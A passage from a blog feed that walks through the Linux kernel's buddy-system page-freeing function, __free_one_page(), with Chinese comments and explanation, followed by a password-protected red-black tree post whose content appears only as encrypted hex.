<span class="hljs-title">page</span> *<span class="hljs-title">buddy</span>;</span><br><span class="hljs-type">bool</span> to_tail;<br><br>    <span class="hljs-comment">// 这里的 MAX_ORDER 和 pageblock_order 都是宏</span><br>max_order = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, MAX_ORDER - <span class="hljs-number">1</span>, pageblock_order);<br><br>VM_BUG_ON(!zone_is_initialized(zone));<br>VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);<br><br>VM_BUG_ON(migratetype == <span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (likely(!is_migrate_isolate(migratetype)))<br>__mod_zone_freepage_state(zone, <span class="hljs-number">1</span> &lt;&lt; order, migratetype);<br><br>VM_BUG_ON_PAGE(pfn &amp; ((<span class="hljs-number">1</span> &lt;&lt; order) - <span class="hljs-number">1</span>), page);<br>VM_BUG_ON_PAGE(bad_range(zone, page), page);<br><br>continue_merging:<br><span class="hljs-keyword">while</span> (order &lt; max_order) &#123;<br><span class="hljs-keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>migratetype);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>buddy_pfn = __find_buddy_pfn(pfn, order);<span class="hljs-comment">// 计算 buddy 页框号</span><br>buddy = page + (buddy_pfn - pfn);<span class="hljs-comment">// 计算 buddy 的页结构体，注意这里是指针加法</span><br><br><span class="hljs-keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="hljs-comment">// 页框号合法性检查</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="hljs-comment">// 检查 page 和 buddy 是否是一对</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们的 buddy（译注：释放页面的“配对”页面，可以看开头的注释） 是空闲的</span><br><span class="hljs-comment"> * 或其为 CONFIG_DEBUG_PAGEALLOC 的 guard page，</span><br><span class="hljs-comment"> * 与其合并后升到高一级的order。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page_is_guard(buddy))<br>clear_page_guard(zone, buddy, order, migratetype);<br><span class="hljs-keyword">else</span><br>del_page_from_free_list(buddy, zone, order);<br>combined_pfn = buddy_pfn &amp; pfn;<br>page = page + (combined_pfn - pfn);<br>pfn = combined_pfn;<br>order++;<br>&#125;<br><span class="hljs-keyword">if</span> (order &lt; MAX_ORDER - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/* 若我们到了这，这意味着 order &gt;= pageblock_order.</span><br><span class="hljs-comment"> * 我们想要预防在常规 pageblock 与独立的pageblock 之间的合并。</span><br><span class="hljs-comment"> * 没有这个，pageblock隔离可能造成错误的空闲页或CMA计数. </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们不想为了更频繁的低阶合并使用这个代码</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;<br><span class="hljs-type">int</span> buddy_mt;<br><br>buddy_pfn = __find_buddy_pfn(pfn, order);<br>buddy = page + (buddy_pfn - pfn);<br>buddy_mt = get_pageblock_migratetype(buddy);<br><br><span class="hljs-keyword">if</span> (migratetype != buddy_mt<br>&amp;&amp; (is_migrate_isolate(migratetype) ||<br>is_migrate_isolate(buddy_mt)))<br><span class="hljs-keyword">goto</span> done_merging;<br>&#125;<br>max_order = order + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> continue_merging;<br>&#125;<br><br>done_merging:<br>set_buddy_order(page, order); <span class="hljs-comment">// 在 page-&gt;private 中储存其 order</span><br><br>    <span class="hljs-comment">// 判断是插到链表头还是链表尾，通常是链表头，即遵循 LIFO</span><br><span class="hljs-keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)<br>to_tail = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_shuffle_order(order))<br>to_tail = shuffle_pick_tail();<br><span class="hljs-keyword">else</span><br>        <span class="hljs-comment">// 该函数会检查是否下一个最高阶的 buddy 是否空闲</span><br>        <span class="hljs-comment">// 若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部</span><br>        <span class="hljs-comment">// 这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</span><br>to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);<br><br>    <span class="hljs-comment">// 插入特定迁移链表</span><br><span class="hljs-keyword">if</span> (to_tail)<br>add_to_free_list_tail(page, zone, order, migratetype);<br><span class="hljs-keyword">else</span><br>add_to_free_list(page, zone, order, migratetype);<br><br><span class="hljs-comment">/* Notify page reporting subsystem of freed page */</span><br><span class="hljs-keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))<br>page_reporting_notify_free(order);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们将与待释放页面凑成一对的内存块称为 buddy，所谓凑成一对便是<strong>这两个内存块在物理上连续，且能凑成一个更高一阶的大内存块</strong>，由此称之为一对 buddies</p><p>该函数主要流程如下：</p><ul><li>（continue_merging，循环开头）调用 <code>__find_buddy_pfn()</code> 计算待释放页面的 buddy 的第一张物理页的页框号，算法比较暴力：<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>调用 <code>page_is_buddy()</code> 检查 buddy 与 待释放页面是否是一对 buddies，若否，则跳到（done_merging），这里的检查需要满足四个要素：<ul><li>buddy 不在空洞中</li><li>buddy 在 buddy system 中（即 buddy 也是空闲内存块）</li><li>待释放页面与其 buddy 在同一个 zone 中</li><li>待释放页面与其 buddy 有着同样的阶（order）</li></ul></li><li>若 buddy 为 guard page，则调用 <code>clear_page_guard()</code> 清楚这个属性让其变成空闲页面，这里清除的操作是通过将 page 结构体的 private 字段置 0 实现的；若否，则说明是常规的空闲页面，调用 <code>del_page_from_free_list()</code> 将其脱链</li><li>此时我们的新的高阶内存块就完成合成了，接下来我们回到循环开头重新寻找这个合成的新内存块的 buddy，这个循环一直持续到 <code>max_order</code> （一般是10），作为下一次循环的页框号的计算方式是 <code>buddy_pfn &amp; pfn</code>，之后做指针运算 <code>page + (combined_pfn - pfn)</code> 找到对应的 page 结构体</li><li>若退出循环时的 order 满足 <code>order &lt; MAX_ORDER - 1</code> ，则调用 <code>has_isolate_pageblock()</code> 检查 zone 中是否有 isolate block，若是则进行相关操作（<s>这块代码还没看懂</s>），最后跳转回（continue_merging）；这一步主要是防止 isolate pageblock 与常规的 pageblock 发生合并</li><li>（done_merging）这一步主要是调用 <code>set_buddy_order()</code> 在 page 结构体的 private 字段存放该内存块的 order</li><li>若是设置了 <code>FPI_TO_TAIL</code> flag，则将 <code>to_tail</code> 置为 true；否则，若内存块的 <code>order &gt;= SHUFFLE_ORDER</code>（<code>MAX_ORDER - 1</code>），则将 <code>to_tail</code> 置为随机结果（<code>shuffle_pick_tail()</code>）；否则置为调用 <code>buddy_merge_likely()</code> 的结果，该函数会检查是否下一个最高阶的 buddy 是否空闲，若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部，这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</li><li>若 <code>to_tail</code> 为真，则调用 <code>add_to_free_list_tail()</code> 将该空闲页添加到链表末尾，否则调用 <code>add_to_free_list()</code> 添加到链表开头</li></ul><h2 id="二、上层封装函数">二、<em>上层封装函数</em></h2><p>所有页面释放的函数其实都是对 <code>__free_one_page()</code> 的封装，最终都会调用到这个函数，路径如下：</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="buddy system" scheme="http://blog.arttnba3.cn/tags/buddy-system/"/>
    
  </entry>
  
  <entry>
    <title>【ALGORITHM.0x04】从二叉搜索树到红黑树</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-08-28T20:46:56.787Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="a3ffa94419157e929ad2827e7d7d8ddf576277f99bc8165e131545e9a35b12f9">afdbd80b698a50e90523fd700308ec65f44e06d46f63079433cfca60657b16ff93bb2b1a04d8edd7ab5ff0d1b5476a6fd26393991a7feb303675f276bef9bd6d95051256b4233fa4340b26aa06280f64514ab8c3b30fa20ac5118fcb917d57ad3b481c5c43dd420e88cf175e2bce126ca7455645d534362aa994abb13840873abe27c8a1581cc14c6651c6d06a034d050b4c25fd58ba26994e703a14c050e325a683687b332969019fa936273472434a3533324279259ad51d532aab5349a738fd09c08310163e0bc9907676d623e8fa3c6588a9259dc32e180bcf83472a5b79fa66ace6aa4f4617c2ea2cbb7ea607f1b7fd940e068e3aca589e2b16032a99b266aba9c8aa64125673fdf7fb87a688745577f1d63c225fdad8723e7fe161736f17220ce05fc0f8229c2c87774dbb1814b111a48fb961add75391219be5b8cef3e0c8556adcc8e9ae86fdc7e4f7541a5d389e36509955fa1ff997bef12411fd92ce1b551421a5a9945cf1b3bfc5e85dbb8317849c58ffe5ee04a064d35af86a9af3d972fbb73c85313b9936782bceafd8532f4853cebe6fd3fa3d23c598b937caabd28e36696023a2bd59e3fe0a93b955f914077a1ae5840728481d51be7a35d059bad5f4c5bdfd867a404fc23315f5897e364af3b6158c418cc2373b6a2a81f64eb803e78ee44236677cce6545b45d854f6b14c8d61e0ef1e5dc0b0e33e18eef2f1eb3cc2bc266a060bfbdf3d0a2d5984ffe9c7138e9363ee78989c3b4dc4302495100da7798d624eaf0bfa0e529e4481dc651044cfbfe5a120a6de427366c1db33481989f206d88e437f0e7c71b3e5317392260c731c65738d0d08507218ba22226ca8c0f3855153cb9dcb15f2b92911116fb6eaa4fef68aab5a45dd140361995bfa6cc2bf6ee0194b3249f1f677256c1e3cca9dfc3e3ecb92328e44bef568d99627bbfafaa3ae75de1044d9b0a16a60d8f6529985ddfa72f9ed88844b0f10766b3345ac58747abbd41a5bfd11fee6e9373a855a2fa99140a793b51f5b0326748ff867dc6b96fd09f8d9092fcf3d72de24d09536241998d6627b02fd65897ddae803b6abaeecb2cb70776dfa1e5bd80b27114e7c40a873e15f699cabba20788f3440a3673021801c0265562d02d6c9be2e601a4f755a2c36350f285378fd603b9209bd42653ac5c687cb74128de6799fa28166ea02cbab8c891b739d307517c908068e7a98ce044cb3be4aad7d9b27d4a159a6934c83631ec23cdf5edcf77088cda4fb45e83f729156a73ed719562a0254cce5e20e7db119a80b5deb356ad71f16b5b476630cfedb2de986310adea5a6226ccebec4af406528cd7ad6872efe556c02d6508a95064dd8673bda0c72ca6d67b621772b91d102a970ca1213d53cd30dcab8c00e2dded0129319f44497781f0d98d668da7271971443751f2d5a21e4d6be9ef7ce53650b01fad3ab17275715c283899053545021e4d08a28d771f06042c9da045d213727041cb3a265d40346fdc490a5743d8c0a9bf872ac82049acadb68289a916ed28bdba12ddbdb8c781f6f7fa418cc5ee83b316e174eb3cf66544ee597071d92df67ccb3c46d3485e99f09741a57aca9d53bc64e77c600e6c3fa1a451b5bc0ca63ad08d2288c5cca84e5149d69dc0ea1ae7297a8a1c9ff428c5ecb9a374ed91d8e5bec0494d7529fdda7bdcff0b36887ff6f99489f1411789df400bec44890328f79692e30a3ec3a6d407b718039571c7e12e9e45c3616cf86998993def58da4ad31c971371cf055dadbc198ef482bbe0ad9861fb6d5b1f7d84d6e408af65a7e18bcdd147161d17c9ca8625626dc43fbd9d53a2f0cd26b2a7a22aed5bcc61be7418db22912ea69794911fd8bafd482f0741334631c1173f83a3bf1dddadb695e07fd12af7d5e76ad2212aa022db2c75a079e40cc1c86f1d22cd87809979fcf85d5a2e72a40bc317c474f5b4541265e5f40bdb9d8e2bb1f8ba99aa5e21e6efde375325d1612bd46e302b68d9b455c90ff2b39cf6f89ea754e3126ecc4c80505398a2c10f28ac222e7dcbe2f3000de60cc4491697637eaf24be13ae1ee50b4180ea933eee6aa7d70f2fb1ffb7bf720e1fb8da6c9e750f0ea029fabd418c15b92a84b8419608155a65a882157b85978eb8998e1d6beac0e4c03ba36867af81350499f77dc32e016067ce5691205464437cbaffe94680f6c4bc0ad332ed10cb73b6cc7c326a314e8712eba26e233c9d0a1a3e31853d3bb9ea656dcd5795724a92225af209b102d5a1aa2253878acdd9796eef14c9453ef55c7bdee3f5ed1fae714b49fd63f3ebd736a9bddda569a64b9beb70ca2cb85504130bf126ec39b4b754bea803a4d0ffaa8975f8d99db655f4e275f4763531b8ee264e401d5cf37c28a975d2771a2f9a313738151b419c6f9f99bd905c57b4725a22433e94a835a723e2ff245a19cf276f74607e7fc1b8ed721467b39dae543935d78cb29ed8f8fc313a6ab937dfe6f7bc5ed3db8d9d2a86895cc8a04f4ad71a4eb19a6bcf4dbd07ecbdbbeb657d6c47c2d66ce6d3efbc65df219ffe65539d2480db8235e1e320ecb493b4897e5d7c80a209a6ff033c805bdd0afc87ed4df64e8e8c9fd30bb5a9bb651ba58da40d8d8e6192c557a2dbc27ea6cd765f022df70c7eadacfe0c9917e10da5b4156aea29fdcba94af3bd1e99cc88decc8119aaea0cd2a0f63a61a34124ba679b89dd15623c6a8a5c4608d23eec23c0b434499b18f36844148de0101bff9bd350fd9d2752a16ee572fbc193815dfac48d9519f00d3d6799696e0992d8528d2b029b9080ee3e833dd08397d59ede05a0c015f1a3fe4da07827f6071801a43abaaabc0680f6fe460c3642e717ecf8fa0b7376c201a4287d210a93b03b1f49737f51eeb4594572475e0dda00eba76e45018667be6f1625cdb4bba3d97b8f99aec7407b2706e912e2729a20531660b46aa0977323fe855a08e5a5f28a9a6e572e05d8a5110a6ee53edec966b4fe735764aa95152c150782a4e306f4c3cedec6f90e75465bf80b8bdeb15e39fc03026b6165bd7b50a7ea007be0300939b838d9b282b55b072a7c27aac2960cf2e463702c8b859b7cea0ee1cd2890e49a8162e8c775ff284435ef10f83359da8bea2712137782349fde453a1b3f261d2fe0819695002dba7a923c91c337e19e2ddca3ea4fd3b1f245400227c91a50f8b50da31d88ccfb97d260772b4ee7b202599a4df834c8c49536f23a00693b6edeaa4d15abbd2dc8ce1cbf4d333080124d25c340ffe85531584efd1277b3d84ca5e2b12d20b94c86249997c674778a8dc4942f4c2b7ffe00c52c69ac474ecf588b43ca53c76eaca34ec7430d3b5e8bc294b3f4131e8eb9a2a1d25759b002542f819b2a9a2a71e70339d773b545c7fea55e910efa831d638a408eeba50e926470bfcdd4026c52f5cedcaa44e5a0db2c59288a9a6ba960ec2cd157346d6e6d32ca3c450c6371dfc8af480244a3df538cb99253c0d899f43608eb5c9bd618e06e81ffba1e3bf22e4840d31d8c8ba75eaa5f6021aa2f06ec827b25edef7bddd81468786c471422842d5074585ab411b00d8be52d0d6e10593d82f62f0481d48bda4d5f8d2bb4027129c1a82efdc706dad76b9510234c0a1355dd264bfd9545e0c36ad72ffaaa870941f853eb62e265fd5a3ae682cddd2e7a2b6ab0f6c866d6d21ef32c1ae17198945022367ccd023dc2172c02d415bb92f02733ed7eb0e83165898c6bd78682c507ddb8ff48d3ececf5104866d3b9c97dd777b5ddced3d08cdcea55e060a487fee5c6f7c4cd12ccd90c570b466dadc7f4ec36baed0a785fe7f4c470ee1e632c9859f3bc7c3c2fd8e32adff21ae881497b055f5302367ee8f97749adb4dce4703fbb0a10acf5213d6160cef0fc950f044f6ff700b971b85f907668345d5b688ad5292c816a422cc11b2b3e50119612162f3bce8f6cdbdf6c6055b23712fcbed0b80e491d55f8faae367570f042df9d7def35198d0670675fa73d796c365228fdae4bb2136d44a1e13cc00d552e511f9d2db8431d44237cf5c2656b951a314c2f835e07d08d308ac05668bf7d9b2523b46bb2c91402fcb383d30be6b92c2a0ed3a9ee8b4b6e5429cef452a048625b3ea487ef7475e0de594950459741a86a16cf08f051e194a8c72e16d954964b063b9b03c4155ba8851040b93937ff76456ac7f81656c77f08ea63b986a91f2dd8f2ba57742d5d0bd94ee3395977a873f8c321c223f47a01e11c51475f96f44c1858dc1b3b5994674e287de9e7af5c484f380be690a0c7327a90b2629490bbf5c6f6609a7a5d592db9495fb2d48e9c428a714fb816513948badc2ca9c07ded80d80a75990738336fc4c4c63b88ef983807e090b00a92d4f0e40e9134f8ee19e3b82866ed9882b718b900a3ee2229fa87c60e0231e5e9f86d293231cb9520603b2196b7ffc2fffaaec28b8644b3b29edfda02064955b47b14374ecd25995dc7d8a6e48ad7cc05af9e0c2dc27295ec37997a4558d348e38733dc367eea57b01e25229bc0ce8092d427764a10c4090870c748353ea4a6f60ec9ddd50e3ddd3f3fc96e16fd17d457e8a3eb2b195a024d793c9f5c8b62b78ccb49a126b65714ffe8d1f76e30400fcd14fc2ce5ada98b55d14cf7915afd0e786d8cb723cdbd2fb007a01810b1018cc0ca94d335c2c7d39bc86b3f1d23fe377e355732d17205cc7f9c118ea19ec65b36854a6092c104031e56923e23634293668545b5185afe1470d6ee4fb3b3634be3138762a7ea781dcfae5f38a7a2c669431460a66bde47197095da7c29403f32cadbbc3b93b56f9fff2ea5800825eba55bcf0cd42009304025679a389ea4a4d51e26def88da1ee297e196653b6cb2c9d5732eb7003bcfb14a659a11e951b619c48bceee1e2ac9243de5bf9be3cfb646582439294082cf67a893a4395a9308fff36c71739cb4beb4dd42085796ec416ab21dbae9f64a1dcafb1955459a9370c21b06e6bd5a5a719de31905cdb0d74304108933031d91b3ec3530abe6edf9f7c024fe04c10c6632dbf3e94e1ca5dcf8180b04add20154e20dd3871022f0de26a5f1f75c15fcd7eba58e07f857f28982405711cf1307e80cee0e5e4ece2532a348b2e7e17ebffceb9e3d795b6b381c57e9f93c092c24715260cd121769d92c19460d4af336355f423df12fc976fb3ba55562cd5fae89066e971b5bb4a5ae949b30a892e5018480a09b07238c9652fb026c305485ba2389945cc40201ebe1a62fb4733f3cac037cf668cc9d8417cea2115c8c60a8e5f8913b5cf5d25853db9dd69b6d3ae978e70c699236e933eaa993400017ab35e89022af40b849a8bca2937afdda9e1f4b2be441baef57191e0d5b3d92ee305155fb4df4dc28df0f31258edc48ea658e0dc7637f5866d64e69750d574f7e6cbb3718d45199af2db601e1b1065d08716bc3f08b972b847e83d15bafe90e6918b8e2ce5ca4554f746d3978f7ecb00c252e2f011d10ec87a87490ee90efc9d26cffd9e3f865ace0b211a5553ab37851a1a493a52f33c29b3e4447b4f8fcf36a0f00e93a471b8442f82f5133b56d0c38e3320498341b48609ba10487ef6c9e5e0ce7a3c4c3c6af911970ff0bba9fe73fd1b0670466fc88492bfa8b4a1e45a939367bb419e5e075afcd4ee86ecbfa7c2c91ec921cd9f68a78dfc549337c52cad9181e468181ddbc66fab7b6ad645d8316651678627cc76299f8926fe70500a08674207700bf33cef2c15a0d9f028f47f2302abfd2bbd10b1e39398abed46f68b32b5e080363067a0001032581c6b9360531a3abbb320a7608603a1f91518b7251c6ccdeb28adb07869d8a45732a78f693ac07de628a010817b86aa719f3f5d8dd676fe6868b8e98a648444fd855e0b83f6a1959f9ba181fd7f032a9672424abe9948c1fd55c7126d5f65ff6196256fe3ec4a502b66491c7889533d07d5604987b2c482889eb5c2097912a87e4ea79415b40076b0f14dd27a2f290ffda5daa9544be705ce304114e35668b070f84a267e28989ad09930b5b7103cda4b28bcbea97511a8470f9a0ef5519dc68ac94a1f91127c44aafa3cac59c3d74a03d1d43d108fe6a810315f218ddced67fe8663e1fd73e9aecb88ebee8d0bd5fa26c2f5348b67b0273eb9fcb7ab04802f4c6f704a43e38fb57c51f1693602a66eb09289113a98831be4fa5c94ac0e2f7345a26e15785f24b29e09c889ccee1a6e771a99d8bea31486fe811958be3b19e680947ac1431538a9c2d0e69ac4f512fd20526567eb766ea1a170680bdbad65167a5ce0fac8168cb9d6c71b194b5045132f37ff9b2e77e89ba51e2d35e7d0367d4d223212592c68552720e3fe412ff4f0c1627520080f5ba38946b12412f9013fe54720bf6dfc501b9ce67f5b4495b4750cf32d2dc0ce5f3e991490a68ab319421ed2b1ff3f6431ed36ba6c440fd891f3777747c2aeda9171e00254710e5b47e1a01caa837d29c981008f0e904647a65053b044ffcb82bd9f631262d458cc15e89ef7724cb4cc7b1a19741c495dcfdf8950032832c280d2a4de9e415ece498121cd31a99b72ab96067e5b2759610ecb6bcf28e969551dba847c8718b179d33f4a311a260c79ab74772133f0fd0c37f4ba50eefe926e3c4089b3d7cbab350cd61ab6d593a88003ff8fba44b3db4c74bea5d537430354414f6032be8107d27e49e773f6760d62ab7f8e900baed7002a5eb9b78c89a817a70770529845aaea1a61ce5026ff3a41b4359bb3f9acc8782ba82d651e79b186a5ca9e864ce5a80ad0be041d9d3f51102936056136e449e2a572474e68ca3131825d7d74e67e6564e92887b96c79732210a890888364c79a6542caed6e898cd489f549308459791979388cdefc8d4e9f1e3d8c66db4e84e7fed62b7d46b6e2c526a080507d976077fb3f814382c1d9a931adcb5dfc9a1a4076bb86a2a7359bca7a3ea9daa9cd964c6321d7a460a571f0f71d3b992b3361c1a254447b5a508195d90a5dbfc8018274b91eec859574725f9cf9e1fd9ae361a5c61323aa90a0ede8d567c81c50237235beec61ea187a3ba390570012efa1c64af7009f248b724d090cb88209c871a450fd32516846f74eb4f796a31de4ac4b515a269cb3ccfc7e80eabe53d1e1c8fd45f9ac8df5b00192580a335adc28e5c2d8d6de5d0f6ea457d5cbb01559c6e8f288aa7817198bbb28119077b1f47debdf49f21ceb6b31460dbae9bbaa732035cbc552c5935d1fa7b4db44379d84774383099cc864106234b47df148254c681d8a88912f6b7fe129301768821e40da2ff9fe9f83f7efd75d686c244a7ab24f3fa2ae7fd4c06d8b8ad2200b94bc5d85bd4b1f5edd0d57e5ad995f0e2b7c44531e102075eaba94517957d785e4f15e94bc11f3ff4fe18ab12827e6eb1d2f340ff30a4274d312e6bb1732240bcc644820f76b30f12208d281fd49c756bdfc21ccfa8f99c426dccfd6689a30b854a0a8e5571df9be62ff6143f7554cf9b1910c9fc8bf37ada272a466bb1b072665646c0b20b1baa1b39cc463a46cc285a4507b8c39a24cb0f510109b6b61565f06c1f82a5f21c95bda2e125704881f405241c94e721a3a83c217b3e554ac9deb503805aee3bba8310fba6a491714f433501bce853b6682747a23e71fb70fb93f6407fb79703e87633e0a21eab73abbc73780c142239efa4d6e0297725f59f086691e1e64fa7041f90c9a958050f1fcdef58e2e96e8d671c612103c8c9027191f25aac5335c5e84d8fbb67b5346e8eaf05004ea21bf353395a0ccc4062821c2bf42130438a1367c87c2e4652e79e571ed94a2418bc7a21e744a593e9053ae6937c3e5b48b3f65a08409257a46cd1c3779b5fe6f483701393f9684de4456ed453e401617fef512f6b57be6d3c7845bcf73edde18867f688c586e5853d27aef512bd930a4123ffb8d02aabbd013a453642fe6e3a816991d4446853809cea4fcd3f4568fdf359c95a5875ac27063d3c8e2114e88fa8293e61fdf792de3547847689cf787fbba3874c140936aadd7d9eac5c99905c8263c7de7941a6152d6e10d0b08516281d0d06a61470364cf4b825e888c88a967788e820738acd88864a0f297ffd37fad788f785cf885ebd04b7d9b11b3a4e1ac59698de0808b344f6c957d4ccb656ecbb6423ea33deebcca99cf3a3bb5b22e842545eb3fe89bbbe16decaf402472af76a3e7d49b49bd4724a86919928067412d8f56fc6349ff252d29762587c9c2ac46d2a9cf09489c6ffd1c58ab779be1553febf23f7d3324c696d1a608fe396627971f389183f4030feb1cb1abbf3bef0d118fa882803b41b4b300f8b94bebfbf2d90409e74baa3d6dfd53cddf098dc3febdb759254949cd073ee4475a7bd50a8a50250168cda49d90926e189c33eb97bb11a835a11c346d592f88d720244e071235debaeae33dc3075d3313585868f396a3a45f722ae8074e98d2bcf3cb48e065a5ede2b56f5245b7213e1c38cebb720bbce6a4eb34f0879de33c191a9078b229cad6bb1afe98b95757ddff1ffe8b4789f4d2009bc8bab749fc4414b15aa79f38c414c8b0c72c4ab6eb91ffa45aee3359769be7acbc2702ceed5522206e54df4231fa9c1aed52901b1a9bd292339020c9d9d0716af20a7d565c9ca6bb09bf53f90f1381a61fa4617a8323e96148380948ec78ee6c311de6f5aa1a9c5f55314973691a8baa66cf4d78d90c7e71f370d80794ec80fdf09da3a704891fb4630826baf54fd97bb3baea405bd88ca8344913038a0b205805f504939db2711d3a773c80a8bffda5b58b5bf2b0484c537ff509cff45d7157edc561a97eae91fd21622597d9812f11b38b9dd569d04ec941665e607b28aded438642a71dfe86255aac10612a5c53d0512e878faba12f607fc9cd7286ce5b43fde834ea7c20ce5d5065b2a1f5e2ac2b87cd2248f33d753a8795096510a587fc05c948bfee678726cb1c416e06809d6873ad91b72d69cbfc135a7898d2221fe2e910e8060d9dee4e1884146b7448d0bd5783525886733dc4f19aec4c64a7e2b7231eaa23e5aae0d15c02da5ad3258d0c9b26206dd94722b66f8fa33d049c83b222a134ea797865557b8c9e321f2cb419f82f19df5927214e4c5486d4e3478a99693066772c191802779656f36610a7a0e9c4f75dce766c9595e620bd583eebd9e444b2b734d3edcd17bf3c670223c13ba68c3448ad99040605d4b36a4acf026c02a8ae69f08dcc3e1687320bd72ae41f0cd985b307fc4d4c3e0825dc155368f9cfc372f58d9917c98f38ba65fb0a8c1b1dfd23610f962f56e1e2e5a567b1fff6d99f47c0491dc80717605c60aac328bdf6c4d1967a0819431024128951d487739ace49c0201ef07dc52c3ae00797b88b87810efd01350bc5f816127067e3dcd9c581059364e645cf8df8e24cf9978b84220422562bc6220a7a030d235a78835a77715496e31f15d6ce6b2a18c76b449ff5c963e689e3157992fe6d8508f964c7a02cecfe30f38c249f0aca2e07b4cb0265cbd54f0e35fe5a27fbd3bc868bbb16a17a41da371a4635c4e7a5b0e407eb54529392268895a232388b55f7bfb2ac6989a612245ee9d69a2cab44485b99484347215095d0f47b1045c603c97c64872d482cb8009b85741cd575b7a2c0e8ff9f7174c8bc9e53eb4f38fbb720e74310d8089e6cfcc78441ee6c6c8de582f83c09b33cef3635e5624fb522302bda5293f2419f2c6d72dba7c959ea11b76d1737963109298acffbc0cb4bde467f13ca2f74c24d74d7e423298136eb53021dffb41c40c0f101bef7f1e644b72b93bc7955f3675f1f548d79feb13e1a25c54394a513b2909e88f054def6161dd42acc1f6b8c04763aa48e7ce1071569a2b2f1267dbc50fc0b01fdc180edf49c16d1db0d677dbd8851b619fd80f181578580cb974fa8ee58660c35826ae98a3ab6b42b3503e38f69d7abc2cda1cfeb81ff8bfe0e0f68550575b16e38131cbaa482c27960b1e05452e16460873cb2e92bb5a8229811ea66b669791de4288f92c33013053f7ebe02f814c7f920d905234008c61d8fee6f142ce8b41c0cb8045613fed21480747b7b87bb197b64c3095bd34e1132203566ffd2e13a44b403f796e5fb7bd98688c2800fbea1419f8218b989a5a95ba481480754be1cf4426ff9b607cc17dd2801d27febd62f1914aa3e4540a4ce4d77e305d17446e2b9855adc532efd7c528e6558d85091b2a7651ce7893dd65e9308b5e4db5dae7670f5f15641b1c293a7eac3408afb4aca6e9773206f2a47716217a2cbec5352d4501a2eee0393c4db0eb95778ad68ce3dd458224b3fc6c406ce9097392f62969bea4c757d06bfea9885dfd7e4d3d435e29a58f4ebbd85c8d32005be6c2cb1c729959bcd355797d02d8bd606d946b04c64c1c77ebef1a7bb442f6c4b0951d42eb2eda528e395e02cde6b202a6f71b6c9c3f6e00061983770f0d4e34314b7cc3132621368b22309fecc69de5d25f10e5c2864a99eac68fafad0379b12762ed75f0b3fff8e7a504ee48048e4067532298d385081eb24169cc36f500a6f7281d9cded54560d6a6f23c43734bb4ba24144d99767a5e267ca6fd040bf2087a64110fc8f5d83b65a2ee7021b63c4452de00f9b9335cf5a7ce61435f76b389c1b7cef1318d789f858c8ba0f396f0c03dc739514a673fdc5e82a6be7fec3b1933ba9e0b0f8eae917349e6295cc476579c8e9cb5ea68b8427e7105c0a3e9fd820e7d462535408f937b6582b7102ffcafe243c72d3a795a54313408d9fa2c9418e39b4983fb2cbbc7783d426809f6b1bf517f263e2e4bb8544eb380e0734ec5e655e57cba13243895440469ced1f37a011a98ba840ffa5b8e9a6a9675332762a752e355311e1e701465421811e903d4be2a6f16307644eae0bfe13a89dd88eeccc5a471e98bd4009ca6758917381024c167bc44569047507ae614a8aabb19cfb04256094bd81b3b965132569a880a1324a3ec9720a2f2987e6037e8f82a1e49d1b0f5bef2ee0771263d2de26c22833b46e6c5e03050d23abf482c0e4f33a17973614e113dc0d84bc4fab02c6795f66ba0cf8849da422f55f559a1b12e0b10d4602a2cde59f40a9ebdc942b07e32dab39809b5d570ae05112c7a5440a97d8345d136feb497659368ddfb62ec8b446de28c70aa00957ad440b353f5956d6b23e9242f99fd48c25a8c4189ab17a8ca29e573fa6121a4feabe8e5b25952a971192bcf63e243ba0e6128daf9855d4b6e487a8b7bf8252c2b59fe5cbd156837582b4e5a1d24fb4663973f624a98